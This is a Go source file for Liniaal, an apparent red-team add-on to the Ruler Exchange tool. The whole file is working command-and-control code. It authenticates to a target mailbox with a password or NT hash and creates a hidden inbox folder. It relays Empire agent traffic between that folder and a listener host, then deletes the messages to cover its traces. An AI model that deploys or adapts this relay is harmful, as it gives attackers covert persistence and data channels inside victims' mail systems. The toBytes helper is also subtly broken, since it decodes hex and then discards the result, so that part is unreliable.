package main

import (
	"bytes"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"net/http/cookiejar"
	"os"
	"strings"
	"time"

	"github.com/sensepost/ruler/autodiscover"
	"github.com/sensepost/ruler/mapi"
	"github.com/sensepost/ruler/utils"
	"golang.org/x/crypto/ssh/terminal"
)

//globals
var config utils.Session
var seen [][]byte
var lastSeen time.Time
var mailpire MailPireConfig
var agent Agent
var nocache = false

//Agent holds information about the current agent
type Agent struct {
	Host         string //the host with Empire listener
	Domain       string //domain name if required
	Username     string //Username
	Password     string //
	URL          string
	UserAgent    string //the UA to use for Empire
	EmailAddress string //email address of our agent
	FolderID     []byte //folder ID we are using
	FolderName   string //name for our hidden folder
	MapiSession  utils.Session
}

//MailPireConfig holds global configuration data
type MailPireConfig struct {
	FolderName string //name for our hidden folder
}

func toBytes(input string) []byte {
	parts := strings.Replace(input, "-", "", -1)
	k, _ := hex.DecodeString(parts)
	k, _ = base64.StdEncoding.DecodeString(input)
	return k
}

func encodeToB64(input []byte) string {
	return base64.StdEncoding.EncodeToString([]byte(input))
}
func fromUnicode(uni []byte) string {
	st := ""
	for _, k := range uni {
		if k != 0x00 {
			st += string(k)
		}
	}
	return st
}

func exit(err error) {
	//we had an error
	if err != nil {
		utils.Error.Println(err)
	}

	//let's disconnect from the MAPI session
	exitcode, err := mapi.Disconnect()
	if err != nil {
		utils.Error.Println(err)
	}
	os.Exit(exitcode)
}

func sendMessage(agent *Agent, rpc string) {

	folderid := agent.FolderID
	propertyTagx := make([]mapi.TaggedPropertyValue, 7)

	propertyTagx[0] = mapi.TaggedPropertyValue{PropertyTag: mapi.PropertyTag{PropertyType: mapi.PtypString, PropertyID: 0x001A}, PropertyValue: utils.UniString("IPM.Note")}
	propertyTagx[1] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagConversationTopic, PropertyValue: utils.UniString("mailpirein")}
	propertyTagx[2] = mapi.PidTagIconIndex
	propertyTagx[3] = mapi.PidTagMessageEditorFormat
	propertyTagx[4] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagNativeBody, PropertyValue: []byte{0x00, 0x00, 0x00, 0x01}}
	propertyTagx[5] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagSubject, PropertyValue: utils.UniString("uncommailpirein")}
	propertyTagx[6] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagNormalizedSubject, PropertyValue: utils.UniString("mailpirein")}

	x, er := mapi.CreateMessage(folderid, propertyTagx)

	if er != nil {
		return
	}
	//because I don't know..
	rpc = string(append([]byte{0x41, 0x41}, []byte(rpc)...))
	bodyProp := mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagBody, PropertyValue: utils.UniString(rpc)}
	mapi.SetPropertyFast(folderid, x.MessageID, bodyProp)

	completeSubject := mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagSubject, PropertyValue: utils.UniString("xxmailpirein")}
	mapi.SetPropertyFast(folderid, x.MessageID, completeSubject)

}

func getMessage(agent *Agent) string {
	//mapi.AuthSession = &agent.MapiSession
	folderid := agent.FolderID
	rpc := ""
	stop := false
	for {
		rows, err := mapi.GetContents(folderid)
		if err != nil {
			time.Sleep(time.Second * (time.Duration)(2))
			continue
		}
		if rows == nil {
			mapi.ReleaseObject(0x01)
			mapi.GetFolder(mapi.INBOX, nil)
			continue
		}
		if rows != nil {

			if rows.RowCount == 0 {
				time.Sleep(time.Second * (time.Duration)(2))
				continue
			}
			for k := 0; k < len(rows.RowData); k++ {
				messageSubject := fromUnicode(rows.RowData[k][0].ValueArray)
				messageid := rows.RowData[k][1].ValueArray

				if strings.ToUpper(messageSubject) == "MAILPIREOUT" {
					//fetch full message
					columns := make([]mapi.PropertyTag, 1)
					columns[0] = mapi.PidTagBody //Column for the Message Body containing our payload

					buff, err := mapi.GetMessageFast(folderid, messageid, columns)
					if err != nil {
						continue
					}
					//convert buffer to rows
					messagerows := mapi.DecodeBufferToRows(buff.TransferBuffer, columns)

					stop = false
					payload := fromUnicode(messagerows[0].ValueArray[:len(messagerows[0].ValueArray)-4])

					if payload == "" {
						continue
					}

					client := &http.Client{}
					var req *http.Request

					utils.Info.Printf("Got message from Agent at: %s", time.Now().Format("02/01/2006 03:04:05 PM"))

					if strings.ToUpper(string(payload[0:5])) == "POST " {
						pp := toBytes(payload[7:])
						req, _ = http.NewRequest("POST", fmt.Sprintf("%s/index.jsp", agent.Host), bytes.NewBuffer(pp))
						req.Header.Add("Content-Type", "application/binary")
						req.Header.Add("User-Agent", agent.UserAgent)
					} else if strings.ToUpper(string(payload[0:3])) == "GET" {
						pi := strings.Split(payload, "-")
						uri := pi[2]
						c := &http.Cookie{Name: "session", Value: pi[1], HttpOnly: false}
						req, _ = http.NewRequest("GET", fmt.Sprintf("%s/%s", agent.Host, uri), nil)
						req.Header.Add("Content-Type", "application/binary")
						req.Header.Add("User-Agent", agent.UserAgent)
						req.AddCookie(c)
					} else if strings.ToUpper(string(payload[0:5])) == "POSTM" {
						pi := strings.Split(payload, "-")
						uri := pi[1]
						c := &http.Cookie{Name: "session", Value: pi[1], HttpOnly: false}
						lenn := len(pi[0]) + len(pi[1]) + 3
						pp := toBytes(payload[lenn:])
						req, _ = http.NewRequest("POST", fmt.Sprintf("%s/%s", agent.Host, uri), bytes.NewBuffer(pp))
						req.Header.Add("Content-Type", "application/binary")
						req.Header.Add("User-Agent", agent.UserAgent)
						req.AddCookie(c)
					} else if strings.ToUpper(string(payload[0:5])) == "STAGE" {
						pi := strings.Split(payload, "-")
						uri := pi[1]
						c := &http.Cookie{Name: "session", Value: pi[1], HttpOnly: false}
						req, _ = http.NewRequest("GET", fmt.Sprintf("%s/%s", agent.Host, uri), nil)
						req.Header.Add("Content-Type", "application/binary")
						req.Header.Add("User-Agent", agent.UserAgent)
						req.AddCookie(c)
					}
					resp, err := client.Do(req)
					if resp != nil {
						defer resp.Body.Close()
					}
					if err != nil {
						continue
					}
					var body []byte
					if body, err = ioutil.ReadAll(resp.Body); err != nil {
						continue
					}
					rpc = encodeToB64(body)

					//we also need to mark the message for deletion
					if _, err = mapi.DeleteMessages(folderid, 1, messageid); err != nil {
						continue
					}
					return rpc
				} else if rows.RowCount == 1 {
					time.Sleep(time.Second * (time.Duration)(5))
				}
			}
		}
		if stop == true {
			break
		}
	}
	return rpc
}

func setupSession() {
	var config utils.Session
	//setup our autodiscover service
	config.Domain = agent.Domain
	config.User = agent.Username
	config.Pass = agent.Password
	config.Email = agent.EmailAddress
	if dec, err := hex.DecodeString(agent.Password); err == nil {
		config.NTHash = dec
		config.Pass = ""
	}
	config.Basic = false
	config.Insecure = true
	config.Verbose = true
	config.Admin = false
	config.RPCEncrypt = false
	config.CookieJar, _ = cookiejar.New(nil)

	autodiscover.SessionConfig = &config

	var resp *utils.AutodiscoverResp
	var rawAutodiscover string
	var err error
	//var err error

	if nocache == false {
		resp = autodiscover.CheckCache(config.Email)
	}

	if resp, rawAutodiscover, err = autodiscover.GetMapiHTTP(agent.EmailAddress, agent.URL, resp); err != nil {
		exit(err)
	}

	mapiURL := mapi.ExtractMapiURL(resp)
	userDN := resp.Response.User.LegacyDN

	if mapiURL == "" {
		if resp, _, config.RPCURL, config.RPCMailbox, config.RPCEncrypt, err = autodiscover.GetRPCHTTP(agent.EmailAddress, agent.URL, resp); err != nil {
			exit(err)
		}

		if resp.Response.User.LegacyDN == "" {
			exit(fmt.Errorf("Both MAPI/HTTP and RPC/HTTP failed. Are the credentials valid? \n%s", resp.Response.Error))
		}

		mapi.Init(&config, resp.Response.User.LegacyDN, "", "", mapi.RPC)
		if nocache == false {
			autodiscover.CreateCache(agent.EmailAddress, rawAutodiscover) //store the autodiscover for future use
		}
	} else {
		mapi.Init(&config, userDN, mapiURL, "", mapi.HTTP)
		if nocache == false {
			autodiscover.CreateCache(agent.EmailAddress, rawAutodiscover) //store the autodiscover for future use
		}
	}
	agent.MapiSession = *mapi.AuthSession
}

func runAgent() {

	logon, err := mapi.Authenticate()
	utils.Info.Println("Authenticated - Setting Up Agent")

	if err != nil {
		exit(err)
	} else if logon.MailboxGUID != nil {
		propertyTags := make([]mapi.PropertyTag, 2)
		propertyTags[0] = mapi.PidTagDisplayName
		propertyTags[1] = mapi.PidTagSubfolders

		rows, er := mapi.GetSubFolders(mapi.AuthSession.Folderids[mapi.INBOX])

		if er == nil {
			for k := 0; k < len(rows.RowData); k++ {
				//convert string from unicode and then check if it is our target folder
				if fromUnicode(rows.RowData[k][0].ValueArray) == agent.FolderName {
					agent.FolderID = rows.RowData[k][1].ValueArray
					break
				}
			}
		}

		if len(agent.FolderID) == 0 {
			utils.Info.Println("Can't find our folder, so create our hidden folder")
			mapi.GetFolder(mapi.INBOX, propertyTags)
			_, err := mapi.CreateFolder(agent.FolderName, true)
			if err != nil {
				return
			}

			time.Sleep(time.Second * (time.Duration)(2))

			rows, _ = mapi.GetSubFolders(mapi.AuthSession.Folderids[mapi.INBOX])

			for k := 0; k < len(rows.RowData); k++ {
				//convert string from unicode and then check if it is our target folder
				if fromUnicode(rows.RowData[k][0].ValueArray) == agent.FolderName {
					agent.FolderID = rows.RowData[k][1].ValueArray
					break
				}
			}
		}
		utils.Info.Print("Agent Listening")
		output("")
		for {
			rpc := getMessage(&agent)
			if rpc != "" {
				utils.Info.Printf("Sending response of length %d to agent", len(rpc))
				sendMessage(&agent, rpc)
				utils.Info.Printf("Sent response to agent at: %s", time.Now().Format("02/01/2006 03:04:05 PM"))
			}
		}
	}
}

//Option struct for controlling agent options through a menu
type Option struct {
	Value       string
	Description string
}

var options = make(map[string]Option)
var term *terminal.Terminal

func autocomp(line string, pos int, key rune) (newLine string, newPos int, ok bool) {
	cmds := []string{"options", "info", "set", "run", "exit"}

	if byte(key) != 9 {
		return line, pos, false
	}

	for _, val := range cmds {
		if len(val) > len(line) && val[:len(line)] == line {
			return val, len(val), true
		}
		if len(line) > len(val) && val == line[:len(val)] {
			if val == "set" {
				for k := range options {
					l := line[len(val)+1:]
					if len(k) >= len(l) && k[:len(l)] == l {
						return fmt.Sprintf("set %s ", k), len(val) + len(k) + 2, true
					}
				}
			}
		}
	}

	return line, pos, false
}

var dataIn, dataOut = io.Pipe()
var strLen = 0

//output writer for the terminal. ensure proper line endings
func output(data string) {
	term.Write([]byte(fmt.Sprintf("%s\r\n", data)))
}

func outputStatus() {
	for {
		data := make([]byte, 2048)
		n, err := dataIn.Read(data)
		if n > 0 {
			ds := strings.Replace(string(data[:n]), "\n", "", -1)
			fmt.Printf(fmt.Sprintf("\r\r%%-%ds", strLen), ds)
			strLen = len(ds)
		}
		if err != nil && err != io.EOF {
			fmt.Println(err)
			break
		}
	}

}

//work-around for map and struct not playing nicely: https://github.com/golang/go/issues/3117
func setOption(name, value string) {
	tmp := options[name]
	tmp.Value = value
	options[name] = tmp
}

//lazy man's get. returns the value of the struct at map["index"]
func getOption(name string) string {
	return options[name].Value
}

func main() {
	options = map[string]Option{
		"EmailAddress": {"demo@outlook.com", "The target mailbox/email address"},
		"Username":     {"", "The username of our target user, if required"},
		"Domain":       {"", "The domain of our target user, if required"},
		"Password":     {"", "The password for the target user"},
		"Folder":       {"Liniaal", "The name of the hidden folder"},
		"Host":         {"http://localhost:8080", "The address of our Empire listener"},
		"URL":          {"", "A custom autodiscover end-point"}}

	oldState, err := terminal.MakeRaw(0)
	if err != nil {
		panic(err)
	}
	term = terminal.NewTerminal(os.Stdin, "> ")
	term.AutoCompleteCallback = autocomp

	output("Liniaal - a communication extension to Ruler")
	output("use 'options' to view settings for your agent. 'set key value' to change settings.\r\nFor anything else, use 'help'")

	for {
		line, _ := term.ReadLine()
		parts := strings.Split(line, " ")

		if line == "exit" {
			terminal.Restore(0, oldState)
			os.Exit(0)
		}
		if line == "options" || line == "info" {
			output("== Agent options ==")
			for k, v := range options {
				output(fmt.Sprintf("%-20s %-30s %s", k, v.Value, v.Description))
			}
		}
		if len(parts) == 3 && parts[0] == "set" {
			setOption(parts[1], parts[2])
		}
		if line == "run" {
			break
		}
	}
	output("")
	terminal.Restore(0, oldState)

	utils.Init(ioutil.Discard, dataOut, dataOut, os.Stderr)
	go outputStatus()

	terminal.Restore(0, oldState)

	agent.Host = getOption("Host")
	agent.EmailAddress = getOption("EmailAddress")
	agent.Password = getOption("Password")
	agent.Username = getOption("Username")
	agent.FolderName = getOption("Folder")
	agent.Domain = getOption("Domain")

	setupSession()

	go runAgent()
	x := make(chan bool, 1)
	<-x

}
